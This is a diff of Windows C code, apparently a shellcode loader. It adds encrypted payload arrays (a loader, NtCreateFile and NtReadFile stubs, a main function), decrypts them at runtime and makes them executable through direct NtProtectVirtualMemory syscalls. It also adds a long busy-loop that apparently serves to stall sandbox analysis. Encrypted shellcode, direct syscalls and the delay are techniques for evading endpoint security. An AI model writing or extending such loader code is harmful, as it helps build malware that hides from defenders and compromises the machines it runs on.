@@ -21,14 +21,28 @@ RtlCreateProcessParametersEx(
 );
 
 NTSTATUS NTAPI sys_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
-NTSTATUS NTAPI sys_NtCreateFile(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PIO_STATUS_BLOCK,PLARGE_INTEGER,ULONG,ULONG,ULONG,ULONG,PVOID,ULONG);
-NTSTATUS NTAPI sys_NtReadFile(HANDLE,HANDLE,PIO_APC_ROUTINE,PVOID,PIO_STATUS_BLOCK,PVOID,ULONG,PLARGE_INTEGER,PULONG);
-void sys_uni();
+//NTSTATUS NTAPI sys_NtCreateFile(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PIO_STATUS_BLOCK,PLARGE_INTEGER,ULONG,ULONG,ULONG,ULONG,PVOID,ULONG);
+//NTSTATUS NTAPI sys_NtReadFile(HANDLE,HANDLE,PIO_APC_ROUTINE,PVOID,PIO_STATUS_BLOCK,PVOID,ULONG,PLARGE_INTEGER,PULONG);
+//void sys_uni();
 
 //char buf[] = {0x90, 0x90, 0x90, 0x90, 0xC3};
 
+void decrypt(uint8_t *buf, size_t bufSize);
+
 uint8_t loader[] = 
 #include "loader.h"
+;
+
+uint8_t sys_create[] =
+#include "encfun/sys_create.h"
+;
+
+uint8_t sys_read[] =
+#include "encfun/sys_read.h"
+;
+
+uint8_t sys_uni[] =
+#include "encfun/sys_uni.h"
 ;
 
 uint8_t main_fun[] = 
@@ -36,19 +50,41 @@ uint8_t main_fun[] =
 ;
 
 int main(int argc, char *argv[]) {
-	void *bufAddr = &main_fun;
-	SIZE_T nBytes = sizeof(main_fun);
-	DWORD oldProt = 0;
+	void *bufAddr;
+	SIZE_T nBytes;
+	DWORD oldProt;
 	main_funs_t main_funs;
+	SIZE_T i, n;
+
+	for (i = 0, n = 0; i < 0x7FFFFFFFF; ++i) {
+		n += i;
+	}
+
+	decrypt(loader, sizeof(loader));
+	decrypt(sys_create, sizeof(sys_create));
+	decrypt(sys_read, sizeof(sys_read));
+	decrypt(sys_uni, sizeof(sys_uni));
+	decrypt(main_fun, sizeof(main_fun));
+
+	bufAddr = sys_create;
+	nBytes = sizeof(sys_create);
+	sys_NtProtectVirtualMemory(GetCurrentProcess(), &bufAddr, &nBytes, PAGE_EXECUTE_READ, &oldProt);
+
+	bufAddr = sys_read;
+	nBytes = sizeof(sys_read);
+	sys_NtProtectVirtualMemory(GetCurrentProcess(), &bufAddr, &nBytes, PAGE_EXECUTE_READ, &oldProt);
+
+	bufAddr = sys_uni;
+	nBytes = sizeof(sys_uni);
+	sys_NtProtectVirtualMemory(GetCurrentProcess(), &bufAddr, &nBytes, PAGE_EXECUTE_READ, &oldProt);
+
+	bufAddr = main_fun;
+	nBytes = sizeof(main_fun);
+	sys_NtProtectVirtualMemory(GetCurrentProcess(), &bufAddr, &nBytes, PAGE_EXECUTE_READ, &oldProt);
 
 
-	printf("BaseAddress - %p\nNumberOfBytes - %u\nOldProt - %x\n------------------\n", bufAddr, nBytes, oldProt);
-	printf("%x", sys_NtProtectVirtualMemory(GetCurrentProcess(), &bufAddr, &nBytes, PAGE_EXECUTE_READ, &oldProt));
-	printf("\n------------------\nBaseAddress - %p\nNumberOfBytes - %u\nOldProt - %x\n", bufAddr, nBytes, oldProt);
-
-
-	main_funs.NtCreateFile = sys_NtCreateFile;
-	main_funs.NtReadFile = sys_NtReadFile;
+	main_funs.NtCreateFile = (PVOID)sys_create;
+	main_funs.NtReadFile = (PVOID)sys_read;
 	main_funs.GetProcessHeap = GetProcessHeap;
 	main_funs.RtlAllocateHeap = RtlAllocateHeap;
 	main_funs.RtlInitUnicodeString = RtlInitUnicodeString;
